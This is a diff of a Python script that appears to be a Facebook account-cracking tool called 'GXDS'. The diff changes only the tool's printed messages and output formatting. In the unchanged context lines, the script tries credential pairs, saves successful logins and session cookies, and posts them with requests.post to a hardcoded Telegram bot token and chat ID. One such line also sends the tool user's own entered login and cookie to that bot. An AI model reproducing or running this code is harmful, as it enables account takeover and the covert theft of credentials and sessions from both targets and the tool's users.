@@ -546,17 +546,17 @@ def xcokis():
                 open("/sdcard/gxds-cookies.txt", "a").write(f"{cookie}\n")
                 requests.post(f"https://api.telegram.org/bot6475095868:AAHH2uGLGm5a9GswmkVor8Xn7Oz9OOMYg6o/sendMessage?chat_id=6542321044&text={xcuser}:{xcpwd} | {cookie}")
             elif "checkpoint" in cookie:
-                print(f"{lr}  [✘] OPPS, CHECKPOINT!")
+                print(f"{lr}  [X] OPPS, CHECKPOINT!")
                 slp(2)
                 xcokis()
             else:
-                print(f"{lr}  [✘] INCORRECT DETAILS")
+                print(f"{lr}  [X] INCORRECT DETAILS")
                 slp(2)
                 xcokis()
     except requests.exceptions.ConnectionError:
-        sys.exit(f"{lr}  [✘] NO INTERNET")
+        sys.exit(f"{lr}  [X] NO INTERNET")
     except KeyboardInterrupt:
-        sys.exit(f"{lr}  [✘] STOPPED!")
+        sys.exit(f"{lr}  [X] STOPPED!")
 
 # FILE PATH
 def clxning():
@@ -573,7 +573,7 @@ def clxning():
         gxdsfiles = open(fl, "r").read().splitlines()
     except:
         slp(1)
-        print(f"\n{lr}  [✘] FILE NOT FOUND.")
+        print(f"\n{lr}  [X] FILE NOT FOUND.")
         print(gxdsprnt)
         slp(3)
         clxning()
@@ -585,6 +585,7 @@ def fxles(gxdsfiles):
     slp(1)
     gxdslogo()
     tl = str(len(gxdsfiles))
+    lxnes1()
     print(f"{lg}  [•] TOTAL ID IN FILE:{dg} " + tl)
     print(f"{lg}  [•] FILE SAVE IN:{dg} /sdcard/gxds.txt")
     lxnes1()
@@ -642,7 +643,7 @@ def gxdsAPI(uid, pxss, tl):
     global oks, loop, cps, ugen
     session = requests.Session()
     sys.stdout.write(
-        f"\r{dg}  [GXDS]: %s/%s | CP: %s | HITS: %s" % (loop, tl, len(cps), len(oks))
+        f"\r\r{dg}  [GXDS]: %s/%s | CP: %s | HITS: %s" % (loop, tl, len(cps), len(oks))
     ),
     sys.stdout.flush()
     try:
@@ -698,7 +699,7 @@ def gxdsAPI(uid, pxss, tl):
                         for key, value in session.cookies.get_dict().items()
                     ]
                 )
-                print(f"""{lgr}  [GXDS HITS] {uid} : {ps} -\033[0;33m {yrs}""")
+                print(f"""\r\r{lgr}  [GXDS HITS] {uid} : {ps} -\033[0;33m {yrs}""")
                 requests.post(f"https://api.telegram.org/bot6475095868:AAHH2uGLGm5a9GswmkVor8Xn7Oz9OOMYg6o/sendMessage?chat_id=6542321044&text={uid}:{ps} - {yrs}\n{coki}")
                 open("/sdcard/gxds-ok.txt", "a").write(uid + "|" + ps + "\n")
                 open("/sdcard/gxds-cookies.txt", "a").write(coki + "\n")
@@ -711,7 +712,7 @@ def gxdsAPI(uid, pxss, tl):
                         for key, value in session.cookies.get_dict().items()
                     ]
                 )
-                print(f"""{lr}  [GXDS X] {uid} : {ps} -\033[0;33m {yrs}""")
+                print(f"""\r\r{lr}  [GXDS X] {uid} : {ps} -\033[0;33m {yrs}""")
                 open("/sdcard/gxds-cp.txt", "a").write(uid + "|" + ps + "\n")
                 open("/sdcard/gxds-cookies.txt", "a").write(coki + "\n")
                 cps.append(uid)
@@ -722,15 +723,7 @@ def gxdsAPI(uid, pxss, tl):
     except requests.exceptions.ConnectionError:
         slp(20)
         pass
-        print("")
-        if len(oks) != 0 or len(cps) != 0:
-          print(f"{lgr}  [✓] CRACKING COMPLETED")
-        print(f"{lgr}  [✓] HIT & COOKIES SAVED IN /SDCARD/GXDS.TXT")
-        print(f"{rc}  [+] TOTAL HITS: %s" % str(len(oks)))
-        print(f"{rc}  [+] TOTAL CP: %s" % str(len(cps)))
-        lxnes()
-        input(f"{dg}  [+] PRESS ENTER TO GO BACK")
-        mxnu()
+        
 
 # FORWARDER
 def gxdsBot():
